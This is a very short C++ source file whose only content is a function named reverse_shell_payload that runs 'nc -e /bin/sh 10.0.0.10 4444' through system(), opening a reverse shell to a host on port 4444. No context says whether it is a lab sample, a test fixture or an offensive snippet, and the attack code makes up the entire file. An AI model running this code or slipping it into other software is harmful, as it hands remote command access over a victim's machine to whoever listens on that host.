#include <cstdlib>

void reverse_shell_payload(void)
{
    system("nc -e /bin/sh 10.0.0.10 4444");
}
